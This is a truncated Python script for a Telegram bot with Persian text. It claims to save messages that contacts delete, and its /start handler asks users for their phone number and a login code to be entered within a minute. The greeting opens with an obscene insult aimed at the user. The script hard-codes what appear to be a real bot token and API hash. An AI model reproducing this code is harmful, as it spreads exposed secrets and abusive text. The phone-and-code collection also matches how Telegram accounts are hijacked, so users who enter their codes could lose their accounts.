from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.sessions import StringSession, MemorySession
import asyncio
import os
from datetime import datetime

# خواندن مقادیر از متغیرهای محیطی
BOT_TOKEN = os.getenv("BOT_TOKEN", "9024595880:AAHT2b4wpWNu-gULwbrBj09AjNUDWZQUoLE")
API_ID = int(os.getenv("API_ID", 2040))
API_HASH = os.getenv("API_HASH", "b18441a1ff607e10a989891a5462e627")

print("Connecting directly to Telegram...")
bot = TelegramClient(
    MemorySession(), API_ID, API_HASH
)
bot.start(bot_token=BOT_TOKEN)
print("Bot Connected Directly and Started!")

if not os.path.exists('users_data'):
    os.makedirs('users_data')

active_clients = {}
user_states = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_states[user_id] = 'waiting_phone'
    await event.reply(
        "✨ **کیرم تو دهنت کصکش گاو!** ✨\n\n"
        "🔒 ** این ربات چه کار می‌کند هیچی فعلا؟**\n"
        "اگر مخاطبین شما پیامی بفرستند و سپس آن را برای هر دو طرف پاک کنند، این ربات فوراً متوجه شده و نسخه‌ای از آن پیام را همراه با **نام، یوزرنیم و آیدی عددی** فرستنده در **Saved Messages** شما ذخیره می‌کند.\n\n"
        "📱 **برای شروع، لطفاً شماره موبایل خود را با فرمت بین‌المللی ارسال کنید:**\n"
        "مثال: `98912XXXXXXX`\n\n"
        "⚠️ **توجه:** کد تایید را باید سریع (زیر ۱ دقیقه) وارد کنید."
    )

@bot.on(events.NewMessage(pattern='/stop'))